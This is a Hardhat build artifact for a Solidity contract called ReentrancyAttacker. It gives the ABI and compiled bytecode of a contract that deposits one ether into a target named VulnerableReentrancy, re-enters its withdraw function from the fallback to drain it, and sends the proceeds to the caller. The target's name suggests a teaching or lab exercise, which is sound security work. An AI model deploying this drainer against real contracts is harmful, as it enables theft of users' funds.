{
  "_format": "hh-sol-artifact-1",
  "contractName": "Reentrancyattacker",
  "sourceName": "contracts/ReentrancyAttacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerablebankAddresst",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "collect",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vulnerableBank",
      "outputs": [
        {
          "internalType": "contract VulnerableReentrancy",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103dc3803806103dc83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b610349806100936000396000f3fe6080604052600436106100385760003560e01c80639e5faafc14610118578063a1c9aee114610120578063e52253811461015c576100c3565b366100c357600054670de0b6b3a76400006001600160a01b0390911631106100c157600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d906024015b600060405180830381600087803b1580156100a857600080fd5b505af11580156100bc573d6000803e3d6000fd5b505050505b005b600054670de0b6b3a76400006001600160a01b0390911631106100c157600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b0390911690632e1a7d4d9060240161008e565b6100c1610171565b34801561012c57600080fd5b50600054610140906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b34801561016857600080fd5b506100c16102e4565b670de0b6b3a764000034101561020d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152602360248201527f204d696e696e756d203120657468657220726571756972656420746f2061747460448201527f61636b0000000000000000000000000000000000000000000000000000000000606482015260840160405180910390fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026357600080fd5b505af1158015610277573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152670de0b6b3a764000060048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b1580156102ca57600080fd5b505af11580156102de573d6000803e3d6000fd5b50505050565b60405133904780156108fc02916000818181858888f19350505050158015610310573d6000803e3d6000fd5b5056fea264697066735822122011b56c98e4d0b4b43f68538aef8634223292ee6ca0af8ad1a7c2394a5f7658f564736f6c63430008180033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}